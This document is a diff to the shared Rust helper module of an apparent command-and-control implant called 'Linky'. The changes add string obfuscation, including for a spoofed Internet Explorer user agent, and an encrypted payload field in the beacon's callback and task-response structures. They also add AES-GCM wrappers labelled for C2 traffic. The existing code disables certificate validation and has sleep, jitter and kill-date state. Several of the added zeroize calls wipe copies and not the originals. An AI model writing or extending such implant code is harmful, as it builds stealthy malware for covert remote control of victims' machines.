@@ -1,5 +1,6 @@
 // Common types, state, and helpers for Linky implants
 
+use obfstr::obfstr as s;
 use std::sync::atomic::{AtomicI64, AtomicU32, AtomicU64, Ordering};
 
 pub mod dispatch;
@@ -20,18 +21,28 @@ pub struct RegisterRequest {
 /// Request sent during stage 3 (callback)
 #[derive(serde::Serialize)]
 pub struct CallbackRequest<'a> {
+    /// Hex-encoded encrypted payload (nonce || ciphertext)
+    #[serde(skip_serializing_if = "Option::is_none")]
+    pub data: Option<&'a str>,
     /// Output of the previously executed task (empty on first poll)
+    #[serde(default)]
     pub q: &'a str,
     /// ID of the completed task (empty if none)
+    #[serde(default)]
     pub tasking: &'a str,
 }
 
 /// Response from the server containing a task
 #[derive(serde::Deserialize)]
 pub struct TaskResponse {
+    /// Hex-encoded encrypted payload (nonce || ciphertext)
+    #[serde(default)]
+    pub data: Option<String>,
     /// Command to execute (empty when idle)
+    #[serde(default)]
     pub q: String,
     /// Task ID to track (empty when idle)
+    #[serde(default)]
     pub tasking: String,
     /// Rolling request ID; implant must echo this on the next call
     pub x_request_id: String,
@@ -56,7 +67,9 @@ pub fn build_client() -> reqwest::blocking::Client {
     reqwest::blocking::Client::builder()
         .danger_accept_invalid_certs(true)
         .cookie_store(true)
-        .user_agent("Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko")
+        .user_agent(s!(
+            "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"
+        ))
         .build()
         .expect("reqwest client init failed")
 }
@@ -66,6 +79,7 @@ pub fn build_client() -> reqwest::blocking::Client {
 /// Derive a 32-byte key from secret and salt using SHA-256
 pub fn derive_key(secret: &str, salt: &str) -> [u8; 32] {
     use sha2::{Digest, Sha256};
+    use zeroize::Zeroize;
 
     let mut hasher = Sha256::new();
     hasher.update(secret.as_bytes());
@@ -74,6 +88,11 @@ pub fn derive_key(secret: &str, salt: &str) -> [u8; 32] {
     let result = hasher.finalize();
     let mut key = [0u8; 32];
     key.copy_from_slice(&result[..32]);
+
+    // Zeroize the intermediate hash result
+    let mut result_bytes = result.as_slice().to_owned();
+    result_bytes.zeroize();
+
     key
 }
 
@@ -83,6 +102,7 @@ pub fn encrypt_config(data: &str, key: &[u8; 32]) -> String {
         aead::{Aead, KeyInit},
         Aes256Gcm, Nonce,
     };
+    use zeroize::Zeroize;
 
     let nonce_bytes = rand::random::<[u8; 12]>();
     let nonce = Nonce::from_slice(&nonce_bytes);
@@ -94,6 +114,11 @@ pub fn encrypt_config(data: &str, key: &[u8; 32]) -> String {
     let mut result = Vec::with_capacity(nonce.len() + ciphertext.len());
     result.extend_from_slice(nonce);
     result.extend_from_slice(&ciphertext);
+
+    // Zeroize sensitive data
+    let mut key_copy = *key;
+    key_copy.zeroize();
+
     hex::encode(result)
 }
 
@@ -103,6 +128,7 @@ pub fn decrypt_config(encrypted_hex: &str, key: &[u8; 32]) -> Option<String> {
         aead::{Aead, KeyInit},
         Aes256Gcm, Nonce,
     };
+    use zeroize::Zeroize;
 
     let encrypted_data = hex::decode(encrypted_hex).ok()?;
     if encrypted_data.len() < 12 {
@@ -111,10 +137,27 @@ pub fn decrypt_config(encrypted_hex: &str, key: &[u8; 32]) -> Option<String> {
     let nonce = Nonce::from_slice(&encrypted_data[..12]);
     let ciphertext = &encrypted_data[12..];
     let cipher = Aes256Gcm::new_from_slice(key).ok()?;
+
+    // Zeroize sensitive data
+    let mut key_copy = *key;
+    key_copy.zeroize();
+
     match cipher.decrypt(nonce, ciphertext) {
         Ok(decrypted) => String::from_utf8(decrypted).ok(),
         Err(_) => None,
     }
+}
+
+/// Encrypt C2 payload data using AES-256-GCM
+/// Returns hex-encoded (nonce || ciphertext)
+pub fn encrypt_payload(data: &str, key: &[u8; 32]) -> String {
+    encrypt_config(data, key)
+}
+
+/// Decrypt C2 payload data using AES-256-GCM
+/// Expects hex-encoded (nonce || ciphertext)
+pub fn decrypt_payload(encrypted_hex: &str, key: &[u8; 32]) -> Option<String> {
+    decrypt_config(encrypted_hex, key)
 }
 
 // ── State (sleep / jitter / kill date) ────────────────────────────────────────
